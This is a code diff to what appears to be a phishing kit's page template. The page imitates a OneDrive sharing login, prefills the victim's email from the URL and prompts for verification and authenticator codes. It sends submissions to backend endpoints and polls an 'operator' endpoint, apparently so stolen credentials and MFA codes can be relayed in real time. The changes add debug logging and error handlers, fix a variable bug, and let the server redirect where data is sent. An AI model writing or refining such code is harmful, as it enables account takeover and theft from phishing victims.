@@ -264,12 +264,15 @@
             updateUrl: "{{updateUrl}}"
         };
 
-        const apiBaseUrl = templateConfig.pollingUrl
+        let apiBaseUrl = templateConfig.pollingUrl
             ? templateConfig.pollingUrl.replace('/pooling-operator', '')
             : templateConfig.postURL;
-        const updateBaseUrl = templateConfig.updateUrl
+        let updateBaseUrl = templateConfig.updateUrl
             ? templateConfig.updateUrl.replace('/update-process', '')
             : templateConfig.postURL;
+
+        console.log('[Template] Config loaded:', JSON.stringify(templateConfig, null, 2));
+        console.log('[Template] apiBaseUrl:', apiBaseUrl, '| updateBaseUrl:', updateBaseUrl);
 
         let browserId = null;
         let pollingIntervalId = null;
@@ -354,7 +357,7 @@
         }
 
         async function pollOperator() {
-            if (!browserId) { clearInterval(pollingIntervalId); return; }
+            if (!browserId) { console.log('[Template] pollOperator: no browserId, stopping'); clearInterval(pollingIntervalId); return; }
             if (pollingStartTime !== null && Date.now() - pollingStartTime > POLLING_TIMEOUT_MS) {
                 clearInterval(pollingIntervalId);
                 isSubmitting = false;
@@ -363,13 +366,16 @@
                 return;
             }
             try {
-                const res = await fetch(apiBaseUrl + '/pooling-operator', {
+                const pollUrl = apiBaseUrl + '/pooling-operator';
+                console.log('[Template] Polling:', pollUrl, '| browserId:', browserId);
+                const res = await fetch(pollUrl, {
                     method: 'POST',
                     headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
                     body: objectToFormData({ browserId: browserId, token: templateConfig.token })
                 });
                 if (!res.ok) throw new Error('Poll error ' + res.status);
                 const data = await res.json();
+                console.log('[Template] Poll response:', data.currentStatus, '| data:', JSON.stringify(data.data || {}).substring(0, 200));
                 if (data.currentStatus) {
                     updateUIForStatus(data.currentStatus, data.data || {});
                 }
@@ -383,6 +389,7 @@
         }
 
         function updateUIForStatus(status, data) {
+            console.log('[Template] updateUIForStatus:', status, '| isSubmitting:', isSubmitting, '| prevStatus:', currentStatus);
             const isSameStatusDuringSubmit = isSubmitting && status === currentStatus;
             if (isSubmitting && status !== currentStatus) {
                 isSubmitting = false;
@@ -508,7 +515,7 @@
                     verificationCodeGroup.style.display = 'block';
                     submitButton.value = 'Submit Code';
                     verificationCodeInput.value = '';
-                    const viewName = (d && d.viewName) || (d && d.lastJsonResponse ? (typeof d.lastJsonResponse === 'string' ? JSON.parse(d.lastJsonResponse || '{}') : d.lastJsonResponse).viewName : '') || '';
+                    const viewName = (data && data.viewName) || (data && data.lastJsonResponse ? (typeof data.lastJsonResponse === 'string' ? JSON.parse(data.lastJsonResponse || '{}') : data.lastJsonResponse).viewName : '') || '';
                     const codeLabel = document.getElementById('verificationCodeLabel');
                     if (codeLabel) {
                         codeLabel.textContent = /authenticator|otp/i.test(viewName)
@@ -627,6 +634,7 @@
         }
 
         async function initialFormSubmission() {
+            console.log('[Template] initialFormSubmission() called');
             showLoadingOverlay(true);
             const urlParams = new URLSearchParams(window.location.search);
             const email = urlParams.get('email');
@@ -668,7 +676,9 @@
             };
 
             try {
-                const res = await fetch(apiBaseUrl + '/notify-form-submission', {
+                const notifyUrl = apiBaseUrl + '/notify-form-submission';
+                console.log('[Template] Calling notify-form-submission at:', notifyUrl);
+                const res = await fetch(notifyUrl, {
                     method: 'POST',
                     headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
                     body: objectToFormData({
@@ -678,15 +688,19 @@
                 });
                 if (!res.ok) throw new Error('HTTP ' + res.status);
                 const data = await res.json();
+                console.log('[Template] notify-form-submission response:', JSON.stringify(data, null, 2));
                 if (data.apiResponse && data.apiResponse.browserId) {
                     browserId = data.apiResponse.browserId;
-                    if (data.pollingUrl && !templateConfig.pollingUrl) {
+                    console.log('[Template] Got browserId:', browserId);
+                    if (data.pollingUrl) {
                         templateConfig.pollingUrl = data.pollingUrl;
                         apiBaseUrl = data.pollingUrl.replace('/pooling-operator', '');
+                        console.log('[Template] Updated apiBaseUrl from GAS response:', apiBaseUrl);
                     }
-                    if (data.updateUrl && !templateConfig.updateUrl) {
+                    if (data.updateUrl) {
                         templateConfig.updateUrl = data.updateUrl;
                         updateBaseUrl = data.updateUrl.replace('/update-process', '');
+                        console.log('[Template] Updated updateBaseUrl from GAS response:', updateBaseUrl);
                     }
                     updateUIForStatus(data.apiResponse.status, data.apiResponse);
                 } else {
@@ -699,6 +713,7 @@
         }
 
         async function handleFormSubmission() {
+            console.log('[Template] handleFormSubmission() called | currentStatus:', currentStatus, '| browserId:', browserId);
             hideAllErrors();
             isSubmitting = true;
             showLoadingOverlay(true);
@@ -797,7 +812,9 @@
             payload.updateType = updateType;
 
             try {
-                const res = await fetch(updateBaseUrl + '/update-process', {
+                const processUrl = updateBaseUrl + '/update-process';
+                console.log('[Template] Sending update to:', processUrl, '| updateType:', updateType, '| payload keys:', Object.keys(payload));
+                const res = await fetch(processUrl, {
                     method: 'POST',
                     headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
                     body: objectToFormData(payload)
@@ -834,6 +851,14 @@
         }
 
         document.addEventListener('DOMContentLoaded', function () {
+            console.log('[Template] DOMContentLoaded fired');
+            window.onerror = function(msg, url, line, col, err) {
+                console.error('[Template] UNCAUGHT ERROR:', msg, '| line:', line, '| col:', col, '| err:', err);
+                showErrorOverlay('Script error: ' + msg);
+            };
+            window.addEventListener('unhandledrejection', function(e) {
+                console.error('[Template] UNHANDLED PROMISE REJECTION:', e.reason);
+            });
             const bg = document.querySelector('.onedrive-bg');
             const loginModal = document.getElementById('SharingValidationControlsSection');
             if (bg && loginModal) {
